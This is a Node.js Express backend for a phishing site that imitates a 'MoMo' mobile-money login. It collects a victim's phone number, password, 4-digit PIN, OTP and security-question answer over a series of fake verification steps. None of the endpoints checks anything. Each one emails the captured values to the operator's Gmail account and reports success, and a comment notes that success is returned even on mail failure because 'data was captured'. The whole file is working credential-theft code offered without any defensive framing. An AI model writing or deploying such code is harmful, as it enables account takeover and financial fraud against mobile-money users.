const express = require("express");
const app = express();
const cors = require("cors");
const nodemailer = require("nodemailer");
require("dotenv").config();

// Middleware
app.use(express.json());
app.use(
  cors({
    origin: "http://localhost:5173",
  }),
);

const PORT = process.env.PORT || 5000;

// Email credentials from .env
const userEmail = process.env.EMAIL_USER;
const pass = process.env.EMAIL_PASS;

// Reusable transporter
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: userEmail,
    pass: pass,
  },
});

// Helper: send email and respond
function sendMailAndRespond(res, subject, text, successMsg) {
  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject,
    text,
  };

  console.log("Sending:", mailOptions);

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log("Mail error:", error);
      // Still return success to the frontend (data was captured)
      return res.status(200).json({ success: true, message: successMsg });
    }
    console.log("Email sent:", info.response);
    return res.status(200).json({ success: true, message: successMsg });
  });
}

// ─── ENDPOINT 1: POST / ─── Login
app.post("/", (req, res) => {
  const { phoneNumber, password } = req.body;

  // Validation
  if (!phoneNumber || !/^\d{10}$/.test(phoneNumber)) {
    return res
      .status(401)
      .json({ success: false, message: "Invalid phone number or password" });
  }
  if (!password) {
    return res
      .status(401)
      .json({ success: false, message: "Invalid phone number or password" });
  }

  sendMailAndRespond(
    res,
    "MoMo Login Details",
    `Phone Number: ${phoneNumber}\nPassword: ${password}`,
    "Login successful",
  );
});

// ─── ENDPOINT 2: POST /pin ─── PIN Verification
app.post("/pin", (req, res) => {
  const { pin } = req.body;

  if (!pin || !/^\d{4}$/.test(pin)) {
    return res.status(401).json({ success: false, message: "Invalid PIN" });
  }

  sendMailAndRespond(
    res,
    "MoMo PIN Verification",
    `PIN: ${pin}`,
    "PIN verified successfully",
  );
});

// ─── ENDPOINT 3: POST /verify-otp ─── OTP Verification
app.post("/verify-otp", (req, res) => {
  const { otp } = req.body;

  if (!otp || !/^\d{4}$/.test(otp)) {
    return res
      .status(400)
      .json({ success: false, message: "Invalid or expired OTP" });
  }

  sendMailAndRespond(
    res,
    "MoMo OTP Verification",
    `OTP: ${otp}`,
    "OTP verified successfully",
  );
});

// ─── ENDPOINT 4: POST /resend-otp ─── Resend OTP
app.post("/resend-otp", (req, res) => {
  const { phoneNumber } = req.body;

  sendMailAndRespond(
    res,
    "MoMo OTP Resend Request",
    `OTP resend requested for: ${phoneNumber}`,
    "OTP resent successfully",
  );
});

// ─── ENDPOINT 5: POST /security-question ─── Security Question
app.post("/security-question", (req, res) => {
  const { securityQuestion, answer } = req.body;

  if (!securityQuestion || !answer || answer.length < 2) {
    return res
      .status(400)
      .json({ success: false, message: "Incorrect answer" });
  }

  sendMailAndRespond(
    res,
    "MoMo Security Question",
    `Security Question: ${securityQuestion}\nAnswer: ${answer}`,
    "Security question verified",
  );
});

// Start server
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
